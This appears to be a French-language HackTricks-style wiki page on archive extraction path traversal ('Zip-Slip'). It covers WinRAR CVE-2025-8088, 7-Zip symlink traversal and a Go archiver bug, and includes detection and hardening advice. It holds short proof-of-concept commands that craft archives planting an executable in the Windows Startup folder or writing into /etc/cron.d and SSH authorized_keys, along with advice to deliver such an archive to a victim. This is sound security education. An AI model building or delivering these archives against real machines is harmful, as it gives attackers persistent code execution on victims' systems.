# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Vue d'ensemble

De nombreux formats d'archives (ZIP, RAR, TAR, 7-ZIP, etc.) permettent à chaque entrée d'avoir son propre **chemin interne**. Lorsqu'un utilitaire d'extraction respecte aveuglément ce chemin, un nom de fichier spécialement conçu contenant `..` ou un **chemin absolu** (par ex. `C:\Windows\System32\`) sera écrit en dehors du répertoire choisi par l'utilisateur.
Cette classe de vulnérabilité est largement connue sous le nom de *Zip-Slip* ou **archive extraction path traversal**.

Les conséquences vont de l'écrasement de fichiers arbitraires à l'obtention directe d'une **remote code execution (RCE)** en déposant un payload dans un emplacement d'**exécution automatique** tel que le dossier Windows *Startup*.

## Cause racine

1. L'attaquant crée une archive où un ou plusieurs en-têtes de fichiers contiennent :
* Séquences de traversée relatives (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Chemins absolus (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou des **symlinks** conçus qui se résolvent en dehors du répertoire cible (courant dans ZIP/TAR sur *nix*).
2. La victime extrait l'archive avec un outil vulnérable qui fait confiance au chemin embarqué (ou suit les symlinks) au lieu de le nettoyer ou de forcer l'extraction sous le répertoire choisi.
3. Le fichier est écrit à l'emplacement contrôlé par l'attaquant et est exécuté/chargé la prochaine fois que le système ou l'utilisateur déclenche ce chemin.

## Exemple réel – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR pour Windows (y compris le CLI `rar` / `unrar`, la DLL et le code source portable) ne validait pas les noms de fichiers lors de l'extraction.
Une archive RAR malveillante contenant une entrée telle que:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
se retrouverait **en dehors** du répertoire de sortie sélectionné et dans le dossier *Startup* de l’utilisateur. Après ouverture de session, Windows exécute automatiquement tout ce qui s'y trouve, fournissant une RCE *persistante*.

### Création d'une archive PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options utilisées :
* `-ep`  – stocke les chemins de fichiers exactement tels quels (ne pas **supprimer** le préfixe `./`).

Remettre `evil.rar` à la victime et lui demander de l'extraire avec une version vulnérable de WinRAR.

### Exploitation observée sur le terrain

ESET a signalé des campagnes de spear-phishing RomCom (Storm-0978/UNC2596) qui joignaient des archives RAR exploitant CVE-2025-8088 pour déployer des backdoors personnalisées et faciliter des opérations de ransomware.

## Cas récents (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug** : Les entrées ZIP qui sont des **symbolic links** étaient déréférencées pendant l'extraction, permettant aux attaquants de sortir du répertoire de destination et d'écraser des chemins arbitraires. L'interaction utilisateur se limite à *ouvrir/extraire* l'archive.
* **Impactés** : 7-Zip 21.02–24.09 (Windows & Linux builds). Corrigé dans **25.00** (juillet 2025) et versions ultérieures.
* **Impact path** : Écraser `Start Menu/Programs/Startup` ou des emplacements exécutés par des services → le code s'exécute à la prochaine ouverture de session ou au redémarrage du service.
* **Quick PoC (Linux)** :
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Sur une build corrigée `/etc/cron.d` ne sera pas modifié ; le symlink est extrait en tant que lien à l'intérieur de /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug** : `archiver.Unarchive()` suit `../` et des entrées ZIP symlinked, écrivant en dehors de `outputDir`.
* **Impactés** : `github.com/mholt/archiver` ≤ 3.5.1 (projet maintenant déprécié).
* **Fix** : Passer à `mholt/archives` ≥ 0.1.0 ou implémenter des vérifications de chemin canonique avant écriture.
* **Reproduction minimale** :
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Conseils de détection

* **Inspection statique** – lister les entrées de l'archive et signaler tout nom contenant `../`, `..\\`, *chemins absolus* (`/`, `C:`) ou des entrées de type *symlink* dont la cible est en dehors du répertoire d'extraction.
* **Canonicalisation** – S'assurer que `realpath(join(dest, name))` commence toujours par `dest`. Rejeter sinon.
* **Sandbox extraction** – Décompresser dans un répertoire jetable en utilisant un extracteur *sûr* (par ex., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) et vérifier que les chemins résultants restent à l'intérieur du répertoire.
* **Endpoint monitoring** – déclencher une alerte pour les nouveaux exécutables écrits dans les emplacements `Startup`/`Run`/`cron` peu après l'ouverture d'une archive par WinRAR/7-Zip/etc.

## Atténuation et durcissement

1. **Mettre à jour l'extracteur** – WinRAR 7.13+ et 7-Zip 25.00+ implémentent la sanitisation des chemins/symlinks. Les deux outils ne disposent toujours pas de mise à jour automatique.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
3. Sur Unix, réduire les privilèges et monter un **chroot/namespace** avant extraction ; sous Windows, utiliser **AppContainer** ou un sandbox.
4. Si vous écrivez du code personnalisé, normalisez avec `realpath()`/`PathCanonicalize()` **avant** la création/écriture, et rejetez toute entrée qui s'échappe du répertoire de destination.

## Cas supplémentaires / historiques affectés

* 2018 – Important alerte *Zip-Slip* par Snyk affectant de nombreuses bibliothèques Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 traversée similaire lors du merge `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) traversée lors de l'extraction TAR dans les slugs (patch en v1.2).
* Toute logique d'extraction personnalisée qui n'appelle pas `PathCanonicalize` / `realpath` avant d'écrire.

## Références

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
